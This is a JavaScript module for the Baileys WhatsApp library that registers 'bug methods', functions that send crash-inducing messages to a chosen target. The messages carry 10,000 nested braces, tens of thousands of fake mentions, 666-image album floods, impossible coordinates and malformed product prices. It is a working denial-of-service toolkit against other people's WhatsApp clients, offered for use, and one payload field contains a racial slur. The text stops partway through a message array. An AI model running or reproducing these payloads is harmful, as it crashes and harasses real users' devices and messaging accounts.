/**
 * @file Bug methods registry
 * @module lib/bug
 * @description Registry of specialized message payloads (exploit/bug methods).
 * @license Apache-2.0
 */

import { generateWAMessageFromContent, generateWAMessage } from "@whiskeysockets/baileys";
import crypto from "node:crypto";

/**
 * Registry of bug methods
 * @type {Object.<string, Function>}
 */
export const bugMethods = {
    /**
     * sql-invis method
     * Copyright by Tama Ryuichi
     */
    "sql-invis": async (sock, target) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36msql-invis\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        const Node = [{
            tag: "bot",
            attrs: {
                biz_bot: "1"
            }
        }];

        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                        messageSecret: crypto.randomBytes(32),
                        supportPayload: JSON.stringify({
                            version: 2,
                            is_ai_message: true,
                            should_show_system_message: true,
                            ticket_id: crypto.randomBytes(16)
                        })
                    },
                    interactiveMessage: {
                        header: {
                            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
                            hasMediaAttachment: false,
                            imageMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
                                fileLength: "11887",
                                height: 1080,
                                width: 1080,
                                mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
                                fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
                                directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1750124469",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                                contextInfo: {
                                    mentionedJid: [target],
                                    participant: target,
                                    remoteJid: target,
                                    expiration: 9741,
                                    ephemeralSettingTimestamp: 9741,
                                    entryPointConversionSource: "WhatsApp.com",
                                    entryPointConversionApp: "WhatsApp",
                                    entryPointConversionDelaySeconds: 9742,
                                    disappearingMode: {
                                        initiator: "INITIATED_BY_OTHER",
                                        trigger: "ACCOUNT_SETTING"
                                    }
                                },
                                scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                                scanLengths: [2071, 6199, 1634, 1983],
                                midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
                            }
                        },
                        body: {
                            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000)
                        }
                    }
                }
            }
        }, {});

        await sock.relayMessage(target, msg.message, {
            participant: {
                jid: target
            },
            additionalNodes: Node,
            messageId: msg.key.id
        });
    },

    /**
     * proto-xvi method
     * Created by Tama
     */
    "proto-xvi": async (sock, target, mention) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mproto-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        const imgCrL = "https://files.catbox.moe/6v0m50.jpg";
        const photo = {
            image: { url: imgCrL },
            caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
        };

        const album = await generateWAMessageFromContent(target, {
            albumMessage: {
                expectedImageCount: 666,
                expectedVideoCount: 0
            }
        }, {
            userJid: target,
            upload: sock.waUploadToServer
        });

        await sock.relayMessage(target, album.message, { messageId: album.key.id });

        for (let i = 0; i < 666; i++) {
            const msg = await generateWAMessage(target, photo, {
                upload: sock.waUploadToServer
            });

            const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

            msg.message[type].contextInfo = {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 30000 }, () =>
                        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                    )
                ],
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                forwardedNewsletterMessageInfo: {
                    newsletterName: "Tama Ryuichi | I'm Beginner",
                    newsletterJid: "0@newsletter",
                    serverMessageId: 1
                },
                messageAssociation: {
                    associationType: 1,
                    parentMessageKey: album.key
                }
            };

            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    { tag: "to", attrs: { jid: target }, content: undefined }
                                ]
                            }
                        ]
                    }
                ]
            });

            if (mention) {
                await sock.relayMessage(target, {
                    statusMentionMessage: {
                        message: { protocolMessage: { key: msg.key, type: 25 } }
                    }
                }, {
                    additionalNodes: [
                        { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
                    ]
                });
            }
        }
    },

    /**
     * delay-invis method
     * Created by @vaacantivv Vaxzy
     */
    "delay-invis": async (sock, target, mention) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mdelay-invis\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        await sock.relayMessage(
            "status@broadcast", {
            extendedTextMessage: {
                text: `OverloadIsHere\n https://t.me/vaacantivv\n`,
                contextInfo: {
                    mentionedJid: [
                        "6285215587498@s.whatsapp.net",
                        ...Array.from({
                            length: 40000
                        }, () =>
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        )
                    ]
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: {
                            jid: target
                        },
                        content: undefined
                    }]
                }]
            }]
        }
        );

        const generateMessage = {
            viewOnceMessage: {
                message: {
                    audioMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                        mimetype: "audio/mpeg",
                        fileSha256: Buffer.from([
                            226, 213, 217, 102, 205, 126, 232, 145, 0, 70, 137, 73, 190, 145, 0,
                            44, 165, 102, 153, 233, 111, 114, 69, 10, 55, 61, 186, 131, 245,
                            153, 93, 211,
                        ]),
                        fileLength: 432722,
                        seconds: 20,
                        ptt: false,
                        mediaKey: Buffer.from([
                            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
                            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
                            145,
                        ]),
                        fileEncSha256: Buffer.from([
                            29, 27, 247, 158, 114, 50, 140, 73, 40, 108, 77, 206, 2, 12, 84,
                            131, 54, 42, 63, 11, 46, 208, 136, 131, 224, 87, 18, 220, 254, 211,
                            83, 153,
                        ]),
                        directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=683D77AE&_nc_sid=5e03e0",
                        mediaKeyTimestamp: 1746275400,
                        contextInfo: {
                            mentionedJid: Array.from({
                                length: 30000
                            },
                                () =>
                                    "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            ),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true,
                        },
                    },
                },
            },
        };

        const msg = await generateWAMessageFromContent(target, generateMessage, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });

        if (mention) {
            await sock.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25,
                            },
                        },
                    },
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "Fuck off nigga" },
                            content: undefined,
                        },
                    ],
                }
            );
        }
    },

    /**
     * one-tap method
     * Created by VaxzyOfficial
     */
    "one-tap": async (sock, target) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mone-tap\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        // First payload: viewOnceMessage
        let msg1 = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "VaxzyIsHere💥",
                                hasMediaAttachment: false,
                                locationMessage: {
                                    degreesLatitude: -999.035,
                                    degreesLongitude: 923,
                                },
                            },
                            body: {
                                text: "VaxzyIsHere💥",
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(10000),
                            },
                        },
                    },
                },
            },
            {}
        );

        await sock.relayMessage(target, msg1.message, {
            messageId: msg1.key.id,
            participant: { jid: target },
        });

        // Second payload: ephemeralMessage
        let msg2 = await generateWAMessageFromContent(
            target,
            {
                ephemeralMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "VaxzyIsHere💥",
                                hasMediaAttachment: false,
                                locationMessage: {
                                    degreesLatitude: -999.035,
                                    degreesLongitude: 923,
                                },
                            },
                            body: {
                                text: "VaxzyIsHere💥",
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(10000),
                            },
                        },
                    },
                },
            },
            {}
        );

        await sock.relayMessage(target, msg2.message, {
            messageId: msg2.key.id,
            participant: { jid: target },
        });
    },

    /**
     * shotgun-xvi method
     * Created by Dhyrz Lenathea
     */
    "shotgun-xvi": async (sock, target) => {
        console.log(`\x1b[32mSuccess Sending Bug\x1b[0m \x1b[36mshotgun-xvi\x1b[0m \x1b[32mTo\x1b[0m \x1b[33m${target}\x1b[0m`);
        const messages = [
            {
                key: { remoteJid: target, fromMe: true, id: "BAE569BA84B3592D" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQNhuSvJ2W1CSUBBjDFbYcFlS-AHXjYf684vAfciRsxdQYswbW2EBN5LGEdzG1NIXFk91hJ00fX0ilcpt-m9F3Ifs7ggSOaylCmmO9_ZmA?ccb=9-4&oh=01_Q5AaIGr6WpvrRYEXk9YhBAr5AnevOQHY8F_EA0Bpxlh9eRYO&oe=67CCA80B&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "t/81w2VWeXP6ELAl8TEDsnvMMMevPoFUDiLPg4KAU00=",
                                fileLength: { low: 3365374, high: 0, unsigned: true },
                                mediaKey: "ezf4wPXgYhb8uqyDXcIbEgjtVj/V0pvTTftx7Xk5OG8=",
                                fileEncSha256: "AuW03Nqf9KQu5c4AmTVQ2iaHq/OaoRsWt1pcx91dcCs=",
                                directPath: "/o1/v/t62.7118-24/f2/m231/AQNhuSvJ2W1CSUBBjDFbYcFlS-AHXjYf684vAfciRsxdQYswbW2EBN5LGEdzG1NIXFk91hJ00fX0ilcpt-m9F3Ifs7ggSOaylCmmO9_ZmA?ccb=9-4&oh=01_Q5AaIGr6WpvrRYEXk9YhBAr5AnevOQHY8F_EA0Bpxlh9eRYO&oe=67CCA80B&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880387, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE501B02E218B31" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m232/AQMoIyB50gGF27dNnJeVqywA5F_4_scthXbyb3I5AAWyz24lmZ68lVG0QErWn2WAxY8FvKylHrqpsFFZy6qd8MEoOBksQxTSuRQy6ICyzA?ccb=9-4&oh=01_Q5AaILRwQ3-x3wevMWTF0mahiwgYHfTKmxfpQovjrADPKx9T&oe=67CCA93F&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "Hs65ol1RlepaDuCtVBD+BGNxzmJclIWFyXhm7l7n4FM=",
                                fileLength: { low: 611448, high: 0, unsigned: true },
                                mediaKey: "X3giGVvG8b5vHs8aU4nCYh05+6GbBCy7JTmlAPBZBmQ=",
                                fileEncSha256: "pUn8ssvX5MxoG7AC5KNjoIbo6QHEMofbn23Dx67V994=",
                                directPath: "/o1/v/t62.7118-24/f2/m232/AQMoIyB50gGF27dNnJeVqywA5F_4_scthXbyb3I5AAWyz24lmZ68lVG0QErWn2WAxY8FvKylHrqpsFFZy6qd8MEoOBksQxTSuRQy6ICyzA?ccb=9-4&oh=01_Q5AaILRwQ3-x3wevMWTF0mahiwgYHfTKmxfpQovjrADPKx9T&oe=67CCA93F&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880389, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE578FEE6E2A55A" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m232/AQNqheV9eTsN4QNH9OHU2rt6HiNETGflA1dBTNr--Q7hxC5A2zG011a5RCptbeOg6CnkclptUN5RNklSTeqU4TytbeubOlYYkU7qd7NrQg?ccb=9-4&oh=01_Q5AaIEMHJ6ehnnfTAsQPDk8AJkgNgmLYWwS733vHops8CtgF&oe=67CCC222&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "ECVO/lRCsME2tTEXUe5V8HtkvkhkmnCWkQMGuXbXoUA=",
                                fileLength: { low: 424344, high: 0, unsigned: true },
                                mediaKey: "ZGa1ZvPkc2nM8jt5GL4pHU5Su1mHr1x/YlPLxkbkIdg=",
                                fileEncSha256: "FJeUySS+YrxQaoftcnjoIQTOh6DVeZoBkv0Bq4n/hTU=",
                                directPath: "/o1/v/t62.7118-24/f2/m232/AQNqheV9eTsN4QNH9OHU2rt6HiNETGflA1dBTNr--Q7hxC5A2zG011a5RCptbeOg6CnkclptUN5RNklSTeqU4TytbeubOlYYkU7qd7NrQg?ccb=9-4&oh=01_Q5AaIEMHJ6ehnnfTAsQPDk8AJkgNgmLYWwS733vHops8CtgF&oe=67CCC222&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880393, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE5281F6F4CCFA8" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/f2/m232/AQPQcUSqUWn0AVUbJSg-5-1Cn0vxhstSOCgmc8cedzD0O9mXmug1wlNSQ40apN5PkBGOhuhYC8AgYZEEU_rtFYNki8D_RB7kYCXIAg2TPg?ccb=9-4&oh=01_Q5AaIL7mBGyzFtxdcpzRkU4b1SLJeUoapu4hGdwKrA_SjHRp&oe=67CC953E&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "mfvdG5/EUAsuKByvQaW/M4A29sgJjQoDhb7rE8HF/n8=",
                                fileLength: { low: 462744, high: 0, unsigned: true },
                                mediaKey: "rUNzm130kxmbIov5oTc8Fh4UymfVJfVLa29dccQu6y8=",
                                fileEncSha256: "lLV8HQWPwr2K0W0jMPqtjxuvkAflM6K0HFgAUqi77/0=",
                                directPath: "/o1/v/t62.7118-24/f2/m232/AQPQcUSqUWn0AVUbJSg-5-1Cn0vxhstSOCgmc8cedzD0O9mXmug1wlNSQ40apN5PkBGOhuhYC8AgYZEEU_rtFYNki8D_RB7kYCXIAg2TPg?ccb=9-4&oh=01_Q5AaIL7mBGyzFtxdcpzRkU4b1SLJeUoapu4hGdwKrA_SjHRp&oe=67CC953E&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880396, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE5ED6F8A919BB0" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m233/AQOh0J76YIA0x7mQhqiz4f16S_akaZvZsIMrFuHeRTR5bDvGZS7Yng1rXJKvv3lnqqbRPXErdTzFNRiMkug9MMrVXETJkjKF0jm2Xho5oQ?ccb=9-4&oh=01_Q5AaIFpDe1aBmkcFwjpSrupeURIlsv5RSCcMhvvsR-v0RzhN&oe=67CCAC47&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "GNRMC9xer+tp67i1E+XXRHBCZVt3AiEC14ZFKg9hAys=",
                                fileLength: { low: 819206, high: 0, unsigned: true },
                                mediaKey: "UBm5EfsssF4GO3h1dT6D9iYHHpdrx5Y6VWRup97ytAw=",
                                fileEncSha256: "FtjCBkWUw/UrUfMqoOomMf7mIXJltb5anNcXaoTzVD0=",
                                directPath: "/o1/v/t62.7118-24/f2/m233/AQOh0J76YIA0x7mQhqiz4f16S_akaZvZsIMrFuHeRTR5bDvGZS7Yng1rXJKvv3lnqqbRPXErdTzFNRiMkug9MMrVXETJkjKF0jm2Xho5oQ?ccb=9-4&oh=01_Q5AaIFpDe1aBmkcFwjpSrupeURIlsv5RSCcMhvvsR-v0RzhN&oe=67CCAC47&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880400, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE5BCA7AF6BA4B9" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m234/AQPJ79UyAlOy-wVJ6WoenTBrRV27Za3cMIenn34GdxZ6351-Or5r_zqCaHPsqdHqLAF_yGxXGG3_sF09ET8OHdvoCqas3MyiiTwU6s96ng?ccb=9-4&oh=01_Q5AaIIJBl615gZv1XoihCQprcs1Z1o-ElISzyBvl2JBktn4L&oe=67CCA612&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "ou2DMZs8Tpe+VGgX4c5LI/cFPGwyCzVRlGEhqXWhxX8=",
                                fileLength: { low: 429138, high: 0, unsigned: true },
                                mediaKey: "7V2kHwZOVs55QCKhuBoV034SfcUezFnPoprLP2+85oM=",
                                fileEncSha256: "w4mMtZjOfL63LmVg6+L+QY9U1e8JGARiLHb1Y2CSHzA=",
                                directPath: "/o1/v/t62.7118-24/f2/m234/AQPJ79UyAlOy-wVJ6WoenTBrRV27Za3cMIenn34GdxZ6351-Or5r_zqCaHPsqdHqLAF_yGxXGG3_sF09ET8OHdvoCqas3MyiiTwU6s96ng?ccb=9-4&oh=01_Q5AaIIJBl615gZv1XoihCQprcs1Z1o-ElISzyBvl2JBktn4L&oe=67CCA612&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880405, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE50F0E73C64B23" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m238/AQNW5MoPbqymY6wkGsVTejrrz0LK6QZyzELmo6FtdVZomkwAuIyqO5LBt8Euiqbdt286oqiFvit5e3a4QyhMf_uMhx6alqiglEa2OX5xGQ?ccb=9-4&oh=01_Q5AaILzyGPhPAweygcD4Ya8Oz1POYKDnsVVN7WjWKPA3alJM&oe=67CCAC4F&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "9LkIzZiGYM58Yq9kob1pBhZulBn2704nGHt6e/h683M=",
                                fileLength: { low: 1254404, high: 0, unsigned: true },
                                mediaKey: "kmaSvutJf/ef4f0Bzzl/rB5YWKVPeHR1//EURfB0vAE=",
                                fileEncSha256: "bwAmvwfkERuTAhCys4EBXB+jY1ZGmrUgFtz/i/KVHrc=",
                                directPath: "/o1/v/t62.7118-24/f2/m238/AQNW5MoPbqymY6wkGsVTejrrz0LK6QZyzELmo6FtdVZomkwAuIyqO5LBt8Euiqbdt286oqiFvit5e3a4QyhMf_uMhx6alqiglEa2OX5xGQ?ccb=9-4&oh=01_Q5AaILzyGPhPAweygcD4Ya8Oz1POYKDnsVVN7WjWKPA3alJM&oe=67CCAC4F&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880412, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE5A4634FF06678" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m235/AQPgxs2Au79cNffc96p4_-cbII-hI9yzmUzZoVrjCIUIuTfxPLruo2Jh9bFqcdNR5x9EHOoaYzeZuXefWBhi2rOpc0nMxBs839BooXawbw?ccb=9-4&oh=01_Q5AaIHa38BN7UfU2DHQ59yQD-BnqDEH_W1CkYjCjjKDQQEZ-&oe=67CCAEF0&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "ZAdkM95+Ih4FmzJyNX3NlbWPkdjpwL81yEpLT2LHte8=",
                                fileLength: { low: 625150, high: 0, unsigned: true },
                                mediaKey: "hdhm++WKx4KfBjkJKMYBpW2VNz1auIB5f8+B00lMwPQ=",
                                fileEncSha256: "duyy8w1dfdurNtqHJgk7kzAPsvpWILJDJryrHHu0AFs=",
                                directPath: "/o1/v/t62.7118-24/f2/m235/AQPgxs2Au79cNffc96p4_-cbII-hI9yzmUzZoVrjCIUIuTfxPLruo2Jh9bFqcdNR5x9EHOoaYzeZuXefWBhi2rOpc0nMxBs839BooXawbw?ccb=9-4&oh=01_Q5AaIHa38BN7UfU2DHQ59yQD-BnqDEH_W1CkYjCjjKDQQEZ-&oe=67CCAEF0&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880420, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE59ADA9B665ED7" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQNzikWTtUfGTphjg_60fF2MtEUR3cvAMqh-cl85HouFtSAoAhyXC52fE-xsiKupeqzWh5M2vWzhpzQY2iDywgXdHwzJTFJ_mugANkXLhg?ccb=9-4&oh=01_Q5AaIC5cdpM2z2s5ufzD1qvvoYfIxOAUv1HLqaYE6uu3kocX&oe=67CC902D&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "WkWReSYGiwI3gEWT3/djvEZDULu+58C+mLh1XLwfkFQ=",
                                fileLength: { low: 284630, high: 0, unsigned: true },
                                mediaKey: "1VR/+IOHEjxPUWxCu7O+SMZtZmq57vDOPDc3s1RsIAI=",
                                fileEncSha256: "kuDNNIuPxraNo9UH6KaNSw6nuts+CJY4JgzLWQ9RJCs=",
                                directPath: "/o1/v/t62.7118-24/f2/m231/AQNzikWTtUfGTphjg_60fF2MtEUR3cvAMqh-cl85HouFtSAoAhyXC52fE-xsiKupeqzWh5M2vWzhpzQY2iDywgXdHwzJTFJ_mugANkXLhg?ccb=9-4&oh=01_Q5AaIC5cdpM2z2s5ufzD1qvvoYfIxOAUv1HLqaYE6uu3kocX&oe=67CC902D&_nc_sid=e6ed6c",
                                mediaKeyTimestamp: { low: 1738880425, high: 0, unsigned: false },
                            },
                            productId: "449756950375071",
                            title: "PC KILLER X 🦄드림 가이 Xeon",
                            description: "",
                            priceAmount1000: { low: 999, high: 0, unsigned: false },
                            url: "wa.me/5512981791389",
                            productImageCount: 1661992960,
                            firstImageId: "99999999",
                            salePriceAmount1000: { low: -1981284353, high: -1966660860, unsigned: false },
                        },
                        businessOwnerJid: target,
                    },
                },
            },
            {
                key: { remoteJid: target, fromMe: true, id: "BAE527384F42B4EC" },
                message: {
                    productMessage: {
                        product: {
                            productImage: {
                                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m232/AQNKlCph1zdbAtdwzV9qkGpH5FFz-T04AOgg4dYv-Im1uX970yxdEBJGeP4ZayAq3Rzi6m-IjDkXDE5FHb32KnwlVyE3K1ggOBP0Odf8Jg?ccb=9-4&oh=01_Q5AaIKoA8rDjXnQ9RYWAFrsKFxCt9X-8dfhJNOXBos-WRTMQ&oe=67CCB7EF&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "a6zrlwKUpHvowMAgNNgOwKr0oa7rXmbEtCUCmmYxcNk=",
                                fileLength: { low: 860998, high: 0, unsigned: true },
